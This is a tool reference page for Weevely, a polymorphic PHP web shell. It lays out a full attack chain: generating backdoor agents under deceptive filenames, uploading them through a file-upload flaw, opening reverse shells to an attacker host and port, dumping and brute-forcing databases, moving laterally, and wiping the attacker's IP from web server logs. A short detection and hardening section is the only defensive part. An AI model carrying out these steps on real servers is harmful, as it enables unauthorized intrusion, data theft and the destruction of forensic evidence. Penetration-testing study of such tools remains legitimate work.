---
title: "Weevely"
category: "Persistence"
tool_name: "Weevely"
version: "4.0.2"
kali_package: "weevely"
install_size: "899 KB"
language: "Python / PHP"
author: "Emilio Pinna"
license: "GPL-3.0"
github: "https://github.com/epinna/weevely3"
kali_url: "https://www.kali.org/tools/weevely/"
mitre_tactic: "persistence"
mitre_tactic_id: "TA0003"
tags: ["persistence", "web-backdoor", "post-exploitation", "php", "polymorphic", "modular", "stealth"]
date: "2026-07-18"
---

# Weevely — Weaponized Web Shell

## 1. Overview

**Weevely** is a weaponized PHP web shell that provides a telnet-like interactive session to a compromised web server. Unlike simple webshells that execute one command at a time, Weevely generates a polymorphic PHP agent that resists antivirus detection, communicates over an obfuscated HTTP protocol, and supports 30+ post-exploitation modules accessible at runtime.

Weevely operates in a client-server model: the Python client generates a small, randomized PHP agent (~700 bytes), uploads it to the target web server, and then communicates with it through encoded HTTP requests. The agent's code mutates on each generation, making signature-based detection unreliable.

### Core Capabilities

- **Polymorphic PHP agent** that evades antivirus and file integrity monitoring
- **30+ post-exploitation modules** covering file operations, network pivoting, SQL access, privilege escalation, and auditing
- **HTTP/HTTPS proxy** to tunnel browser traffic through the compromised server
- **SQL console** pivoting through the target to reach internal databases
- **Reverse and direct TCP shells** for traditional netcat-style connectivity
- **Filesystem mounting** via HTTPfs for local access to remote files
- **Brute-force SQL credentials** using the target's database connectivity
- **Session recovery** with automatic session file persistence
- **Module extensibility** via Python module development framework

### When to Use Weevely

- Post-exploitation after gaining PHP file upload capability on a web server
- Long-term persistent access requiring modular, extensible functionality
- Environments where simple webshells are detected by WAF or antivirus
- Network pivoting through a compromised web server
- Internal database access through a web application foothold
- Engagements requiring session recovery and continuity
- Lab environments for practicing post-exploitation techniques

### Comparison with Other Tools

| Feature | Weevely | WeBaCoo | simple-backdoor.php |
|---------|---------|---------|-------------------|
| Polymorphic agent | Yes | No (obfuscated) | No |
| Modules | 30+ | 5 | 0 |
| Session recovery | Yes | No | No |
| Proxy support | HTTP/SOCKS/Tor | HTTP/Tor | None |
| SQL access | Yes (console + dump) | Yes (MySQL/PostgreSQL CLI) | No |
| File operations | Full (upload, download, edit, mount) | Upload/download only | None |
| Reverse shells | Yes (TCP) | No | No |
| Port scanning | Yes (pivoting) | No | No |
| Password protection | Yes | Yes | None |

---

## 2. Installation

### Kali Linux (Default)

```bash
sudo apt install weevely
```

**Explanation:** Weevely is included in Kali's default, large, and everything metapackages. The package installs Python 3 dependencies (`python3-dateutil`, `python3-mako`, `python3-prettytable`, `python3-socks`, `python3-yaml`).

### From Source

```bash
git clone https://github.com/epinna/weevely3.git /opt/weevely3
cd /opt/weevely3
pip3 install -r requirements.txt
```

**Explanation:** Clones the upstream repository and installs Python dependencies. Useful for development or when running the latest unreleased version.

### Dependencies

| Package | Purpose | Required |
|---------|---------|----------|
| `python3` | Runtime interpreter | Yes |
| `python3-dateutil` | Session timestamp handling | Yes |
| `python3-mako` | Template rendering for module output | Yes |
| `python3-prettytable` | Formatted table output | Yes |
| `python3-socks` | SOCKS proxy and Tor support | Yes |
| `python3-yaml` | Configuration file parsing | Yes |

### Verifying Installation

```bash
weevely --help
```

**Explanation:** Displays the help screen with subcommands (`terminal`, `session`, `generate`). If this produces output, the installation is correct.

---

## 3. Command Reference

### 3.1 Agent Generation

```bash
weevely generate s3cr3t /tmp/agent.php
```

**Explanation:** Generates a polymorphic PHP backdoor agent protected with the password `s3cr3t`. The agent file is written to `/tmp/agent.php`. The generated agent is approximately 671-700 bytes and contains randomized variable names, function structures, and encoding patterns on each generation.

#### Generation Variants

```bash
# Standard generation
weevely generate T0pS3cr3tP@ss /tmp/agent.php

# Generate to a descriptive filename for social engineering
weevely generate MyP@ssw0rd /tmp/wordpress-config.php.bak

# Generate multiple agents for redundancy
weevely generate Pass1 /tmp/agent1.php
weevely generate Pass2 /tmp/agent2.php
weevely generate Pass3 /tmp/agent3.php
```

**Explanation:** Each generation produces a unique file. Using different passwords and filenames provides operational flexibility.

### 3.2 Connecting to an Agent

```bash
weevely http://192.168.1.50/agent.php s3cr3t
```

**Explanation:** Establishes a session with the deployed agent. The first command typed will trigger the connection. The session file is automatically saved to `sessions/192.168.1.50/agent.session` for recovery.

#### Connection Examples

```bash
# Basic connection
weevely http://192.168.1.50/agent.php T0pS3cr3tP@ss

# Through a proxy
weevely http://target.example.com/agent.php MyP@ss --proxy socks5://127.0.0.1:9050
```

### 3.3 Single Command Execution

```bash
weevely http://192.168.1.50/agent.php s3cr3t "uname -a"
weevely http://192.168.1.50/agent.php s3cr3t "id"
weevely http://192.168.1.50/agent.php s3cr3t "cat /etc/passwd"
```

**Explanation:** Executes a single command on the target and returns the output. Useful for scripting and automation.

### 3.4 Session Recovery

```bash
weevely session sessions/192.168.1.50/agent.session
```

**Explanation:** Resumes a previous session using the saved session file. This restores module state and connection parameters without reconnecting from scratch.

### 3.5 Proxy Configuration

```text
weevely> :set proxy socks5://127.0.0.1:9050
weevely> :set proxy http://127.0.0.1:8080
```

**Explanation:** Configures a proxy for all subsequent communication. The `:set` command modifies session parameters. Supported proxy types: `http`, `https`, `socks4`, `socks5`.

### 3.6 Help System

```text
weevely> :help
weevely> :module_name --help
```

**Explanation:** Displays available modules and their descriptions. Prepend `:` to any command to access Weevely's built-in modules instead of OS shell commands.

---

## 4. Module Reference

Weevely's power lies in its 30+ post-exploitation modules. Each module is invoked with `:module_name` and supports `--help` for options.

### 4.1 File Operations

| Module | Description | Example |
|--------|-------------|---------|
| `:file_read` | Read remote file contents | `:file_read /etc/passwd` |
| `:file_upload` | Upload file to target | `:file_upload /local/file /remote/path` |
| `:file_download` | Download file from target | `:file_download /remote/file /local/path` |
| `:file_edit` | Edit remote file in local editor | `:file_edit /remote/config.php` |
| `:file_ls` | List directory contents | `:file_ls /var/www/html/` |
| `:file_find` | Find files by name/attributes | `:file_find / -name "*.conf"` |
| `:file_cp` | Copy file | `:file_cp /src /dst` |
| `:file_rm` | Remove remote file | `:file_rm /tmp/shell.log` |
| `:file_touch` | Modify file timestamps | `:file_touch /tmp/shell.php 202501011200` |
| `:file_grep` | Search file contents with regex | `:file_grep "password" /etc/*.conf` |
| `:file_clearlog` | Remove string from a file | `:file_clearlog /var/log/apache2/access.log 192.168.1.100` |
| `:file_check` | Get file attributes and permissions | `:file_check /var/www/html/config.php` |
| `:file_mount` | Mount remote filesystem via HTTPfs | `:file_mount /mnt/remote` |
| `:file_upload2web` | Upload file to web folder, get URL | `:file_upload2web /tmp/shell.php images/` |
| `:file_enum` | Check existence of multiple paths | `:file_enum /etc/passwd /etc/shadow` |
| `:file_zip` | Compress/expand zip archives | `:file_zip -c /tmp/files.zip /var/www/` |
| `:file_gzip` | Compress/expand gzip files | `:file_gzip -c /tmp/data.gz /var/log/syslog` |
| `:file_bzip2` | Compress/expand bzip2 files | `:file_bzip2 -c /tmp/data.bz2 /var/log/syslog` |
| `:file_tar` | Compress/expand tar archives | `:file_tar -c /tmp/backup.tar /var/www/` |

#### File Operation Examples

```text
# Read a configuration file
weevely> :file_read /var/www/html/wp-config.php

# Upload a local tool to the target
weevely> :file_upload /tmp/linpeas.sh /tmp/linpeas.sh

# Download a database dump
weevely> :file_download /var/backups/database.sql /tmp/database.sql

# Edit a remote file (opens local editor)
weevely> :file_edit /var/www/html/config.php

# Find SUID binaries
weevely> :file_find / -perm -4000 2>/dev/null

# Clean access logs
weevely> :file_clearlog /var/log/apache2/access.log 192.168.1.100

# Upload to web-accessible folder and get URL
weevely> :file_upload2web /tmp/rev.php images/

# Mount remote filesystem locally
weevely> :file_mount /mnt/remote
```

### 4.2 Shell and System

| Module | Description | Example |
|--------|-------------|---------|
| `:shell_sh` | Execute OS shell commands | `:shell_sh whoami` |
| `:shell_ssh` | Execute commands through SSH | `:shell_ssh user@192.168.1.60 "id"` |
| `:shell_su` | Execute commands with `su` | `:shell_su root password123 "id"` |
| `:shell_php` | Execute PHP code | `:shell_php phpinfo();` |
| `:system_info` | Collect system information | `:system_info` |
| `:system_procs` | List running processes | `:system_procs` |
| `:system_extensions` | List PHP and webserver extensions | `:system_extensions` |

#### Shell Examples

```text
# Get system information
weevely> :system_info

# Execute a shell command
weevely> :shell_sh "cat /etc/passwd"

# SSH to another host from the target
weevely> :shell_ssh admin@192.168.1.60 "ls -la"

# Escalate to root via su
weevely> :shell_su root toor123 "id"

# Execute PHP code directly
weevely> :shell_php "echo shell_exec('whoami');"

# List running processes
weevely> :system_procs

# Check PHP configuration
weevely> :system_extensions
```

### 4.3 Network and Proxy

| Module | Description | Example |
|--------|-------------|---------|
| `:net_proxy` | HTTP/HTTPS proxy through target | `:net_proxy 8080` |
| `:net_phpproxy` | Install PHP proxy on target | `:net_phpproxy /var/www/html/proxy.php` |
| `:net_scan` | TCP port scanner | `:net_scan 192.168.1.0/24 80,443,3306` |
| `:net_curl` | HTTP request through target | `:net_curl http://192.168.1.60/` |
| `:net_mail` | Send email from target | `:net_mail user@example.com "Subject" "Body"` |
| `:net_ifconfig` | Get network interface addresses | `:net_ifconfig` |
| `:net_socksproxy` | SOCKS proxy through target | `:net_socksproxy 1080` |

#### Network Examples

```text
# Get network configuration
weevely> :net_ifconfig

# Scan internal network
weevely> :net_scan 192.168.1.0/24 80,443,3306,22,8080

# Start HTTP proxy for browser tunneling
weevely> :net_proxy 8080
# Then configure browser: 127.0.0.1:8080

# Make HTTP request through the target
weevely> :net_curl http://192.168.1.60/admin/

# Install PHP proxy for persistent access
weevely> :net_phpproxy /var/www/html/proxy.php
```

### 4.4 SQL Access

| Module | Description | Example |
|--------|-------------|---------|
| `:sql_console` | Execute SQL queries | `:sql_console -user root -passwd pass123 "SHOW DATABASES"` |
| `:sql_dump` | Dump database contents | `:sql_dump -user root -passwd pass123 mydb` |
| `:bruteforce_sql` | Brute-force SQL credentials | `:bruteforce_sql -users users.txt -passwords passwords.txt` |

#### SQL Examples

```text
# Connect to MySQL database
weevely> :sql_console -user root -passwd dbpassword "SHOW DATABASES"

# Query specific database
weevely> :sql_console -user root -passwd dbpassword "SELECT * FROM users"

# Dump entire database
weevely> :sql_dump -user root -passwd dbpassword wordpress_db

# Brute-force SQL credentials
weevely> :bruteforce_sql -users /tmp/users.txt -passwords /tmp/passwords.txt
```

### 4.5 Backdoor and Reverse Shells

| Module | Description | Example |
|--------|-------------|---------|
| `:backdoor_reversetcp` | Spawn reverse TCP shell | `:backdoor_reversetcp 192.168.1.100 4444` |
| `:backdoor_tcp` | Open TCP shell on target port | `:backdoor_tcp 4444` |

#### Reverse Shell Example

```text
# On attacker machine (start listener first)
nc -lvnp 4444

# In Weevely session
weevely> :backdoor_reversetcp 192.168.1.100 4444
```

### 4.6 Audit and Reconnaissance

| Module | Description | Example |
|--------|-------------|---------|
| `:audit_filesystem` | Audit filesystem permissions | `:audit_filesystem /var/www` |
| `:audit_suidsgid` | Find SUID/SGID files | `:audit_suidsgid /` |
| `:audit_disablefunctionbypass` | Bypass `disable_functions` | `:audit_disablefunctionbypass` |
| `:audit_etcpasswd` | Read `/etc/passwd` with techniques | `:audit_etcpasswd` |
| `:audit_phpconf` | Audit PHP configuration | `:audit_phpconf` |

#### Audit Examples

```text
# Find SUID/SGID binaries for privilege escalation
weevely> :audit_suidsgid /

# Audit filesystem permissions
weevely> :audit_filesystem /var/www/html

# Try to bypass disable_functions
weevely> :audit_disablefunctionbypass

# Read /etc/passwd even with restrictions
weevely> :audit_etcpasswd

# Check PHP configuration
weevely> :audit_phpconf
```

---

## 5. Attack Chain Integration

### Step 1: Reconnaissance

```bash
# Fingerprint the target
whatweb http://192.168.1.50/

# Enumerate web directories
gobuster dir -u http://192.168.1.50/ -w /usr/share/wordlists/dirb/common.txt

# Find upload points
gobuster dir -u http://192.168.1.50/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
```

### Step 2: Generate the Agent

```bash
weevely generate T0pS3cr3t /tmp/agent.php
```

**Explanation:** Creates a polymorphic PHP agent with the password `T0pS3cr3t`. The generated file is approximately 671 bytes.

### Step 3: Upload to Target

```bash
# Method A: SCP (requires SSH)
scp /tmp/agent.php user@192.168.1.50:/var/www/html/uploads/agent.php

# Method B: File upload vulnerability
curl -F "file=@/tmp/agent.php;type=image/jpeg" \
  -F "name=avatar.jpg.php" \
  http://192.168.1.50/upload.php

# Method C: SQL injection INTO OUTFILE
# (requires MySQL FILE privilege and writable directory)
```

**Explanation:** The upload method depends on the access vector. Rename the agent to blend with legitimate files (e.g., `icon.php`, `config.inc.php`) to avoid filename-based filtering.

### Step 4: Verify Deployment

```bash
curl -s -o /dev/null -w "%{http_code}" http://192.168.1.50/uploads/agent.php
```

**Explanation:** HTTP 200 confirms the file is accessible. A 403 may indicate directory restrictions; a 404 means the file path is wrong.

### Step 5: Establish Session

```bash
weevely http://192.168.1.50/uploads/agent.php T0pS3cr3t
```

**Explanation:** Connects to the agent. Type a command (e.g., `uname -a`) to establish the session. The session file is saved automatically for recovery.

### Step 6: Post-Exploitation

```text
weevely> :system_info
weevely> :audit_suidsgid /
weevely> :net_scan 192.168.1.0/24 80,443,3306
weevely> :sql_console -user root -passwd dbpass "SHOW TABLES"
weevely> :net_proxy 8080
weevely> :file_upload /tmp/rev.php /var/www/html/rev.php
weevely> :backdoor_reversetcp 192.168.1.100 4444
```

### Step 7: Cleanup

```text
weevely> :file_rm /var/www/html/uploads/agent.php
weevely> :file_clearlog /var/log/apache2/access.log 192.168.1.100
```

---

## 6. Advanced Use Cases

### HTTP/HTTPS Proxy Tunneling

```text
weevely> :net_proxy 8080
```

**Explanation:** Opens a local proxy on port 8080. Configure the browser to use `127.0.0.1:8080` as an HTTP proxy. All browser traffic will route through the compromised web server, allowing access to internal web applications.

### SQL Database Pivoting

```text
weevely> :sql_console -user webapp -passwd s3cr3t -host 192.168.1.60
mysql> SHOW DATABASES;
mysql> SELECT * FROM users;
mysql> :sql_dump -user webapp -passwd s3cr3t -host 192.168.1.60 users_db
```

**Explanation:** Weevely connects to the target's MySQL database using the web application's credentials, providing direct SQL access without needing the database port to be exposed externally.

### Bypassing disable_functions

```text
weevely> :audit_disablefunctionbypass
```

**Explanation:** When PHP `disable_functions` blocks `system`, `exec`, and similar functions, this module attempts to bypass restrictions using `mod_cgi` and `.htaccess` manipulation. It enables a restricted shell even on hardened PHP configurations.

### Log Cleanup

```text
weevely> :file_clearlog /var/log/apache2/access.log 192.168.1.100
```

**Explanation:** Removes all log entries containing the attacker's IP address from Apache access logs. Critical for anti-forensics during authorized engagements.

### Mount Remote Filesystem

```bash
# From the Weevely session
weevely> :file_mount /mnt/remote

# From a separate terminal
ls /mnt/remote/
```

**Explanation:** Mounts the target's filesystem locally using HTTPfs. Enables browsing and editing remote files with local tools without SCP access.

### Lateral Movement

```text
# SSH to another host from the target
weevely> :shell_ssh admin@192.168.1.60 "uname -a"

# Upload a new agent to the internal host
weevely> :file_upload /tmp/agent2.php /var/www/html/agent2.php

# Connect to the new agent
# (from attacker machine)
weevely http://192.168.1.60/agent2.php NewP@ss
```

---

## 7. Detection and Defense

### Agent Detection

```bash
# Search for Weevely agent patterns
grep -rn "base64_decode\|gzinflate\|str_rot13\|call_user_func" /var/www/html/ --include="*.php"

# Find small PHP files (Weevely agents are ~671 bytes)
find /var/www/html -name "*.php" -size -1k -exec ls -la {} \;

# Check for encoded PHP one-liners
find /var/www/html -name "*.php" -exec wc -l {} \; | awk '$1 <= 3'

# Search for PHP files with both encoding and execution
grep -rn "base64_decode.*exec\|gzinflate.*system\|eval.*base64" /var/www/html/ --include="*.php"
```

### Network Detection

- Monitor for HTTP requests with unusual `Content-Type` or encoded body content
- Flag repeated requests to the same PHP file from the same IP (session keepalive)
- Alert on HTTP responses with `Set-Cookie` headers containing encoded data
- Detect proxy traffic patterns (many outbound connections from a web server IP)
- Monitor for connections to non-standard ports (reverse shell indicators)

### Agent Characteristic Indicators

- **Polymorphic but persistent:** each generation is unique, but the communication pattern is consistent
- **Session files:** Weevely creates `sessions/` directories on the attacker machine
- **Cookie or POST body encoding:** commands are Base64-encoded with custom delimiters
- **User-Agent anomaly:** the Python client sends a distinct User-Agent by default
- **Request frequency:** automated module execution creates periodic request patterns

### Preventive Measures

- **File integrity monitoring** (AIDE, Tripwire) on all web-root directories
- **`disable_functions`** in `php.ini`: block `system`, `exec`, `passthru`, `shell_exec`, `popen`, `proc_open`, `eval`, `assert`
- **`open_basedir`** restriction to limit file access scope
- **Upload validation:** verify MIME type, extension, and file content (magic bytes)
- **WAF rules** against Base64-encoded PHP content and known shell signatures
- **Regular security audits** of PHP configuration and file permissions
- **Network segmentation:** restrict outbound connections from web servers to only necessary destinations
- **PHP configuration hardening:** `allow_url_include = Off`, `expose_php = Off`

---

## 8. Operational Considerations

### Stealth Techniques

- **Agent polymorphism:** Each `generate` call produces a unique file, defeating hash-based detection
- **Custom User-Agent:** Configure the Python client to match the target environment's browser fingerprint
- **Cookie-based communication:** Use session cookies to blend command traffic with legitimate web traffic
- **Log cleanup:** Use `file_clearlog` to remove IP traces from access logs
- **Timestamp manipulation:** Use `file_touch` to match file modification times with surrounding files
- **Multiple agents:** Deploy several agents with different passwords for redundancy
- **Blended filenames:** Name agents to match existing files in the web root

### Limitations

- **PHP only:** The agent is PHP-specific; no support for other server-side languages
- **Agent upload required:** Weevely needs a file upload capability or existing write access to deploy the agent
- **No HTTPS by default:** The Python client uses HTTP; HTTPS requires additional configuration or a reverse proxy
- **Password-based authentication:** the agent password is sent in the first request; if intercepted, the session is compromised
- **Session files on attacker:** Weevely stores session data locally; secure the attacker machine
- **Python dependency:** The client requires Python 3 and several packages
- **Agent size:** ~671 bytes is small but not invisible; file integrity monitoring can detect it

### Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Connection refused | Agent not accessible via HTTP | Verify the URL with `curl -I` |
| Empty output | `disable_functions` blocking PHP execution | Use `:audit_disablefunctionbypass` |
| Session not saving | Insufficient local permissions | Check write access to `sessions/` directory |
| Module not found | Typo in module name | Use `<TAB>` for command completion |
| Proxy not working | Proxy server unreachable | Verify proxy is running; try `-v` for verbose output |

### Best Practices

- Generate a unique agent for each engagement (never reuse agent files)
- Use strong passwords (16+ characters with mixed case, numbers, symbols)
- Place the agent in a directory with existing PHP files to avoid anomaly detection
- Combine `file_touch` with surrounding file timestamps after deployment
- Remove the agent immediately after the engagement concludes
- Document all agent locations, passwords, and session files for the final report
- Test agent upload with the target's antivirus and WAF before deployment
- Use `:audit_phpconf` to understand target PHP restrictions before attempting modules

---

## Resources

- **Weevely GitHub:** https://github.com/epinna/weevely3
- **Weevely Wiki:** https://github.com/epinna/weevely3/wiki
- **Getting Started Guide:** https://github.com/epinna/weevely3/wiki/Getting-Started
- **Module Development:** https://github.com/epinna/weevely3/wiki/Developing-a-new-module
- **Kali Linux Tool Page:** https://www.kali.org/tools/weevely/
- **MITRE ATT&CK Persistence (TA0003):** https://attack.mitre.org/tactics/TA0003/
- **PHP Security Manual:** https://www.php.net/manual/en/security.php
- **OffSec PEN-200 Course:** https://www.offsec.com/courses/pen-200/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
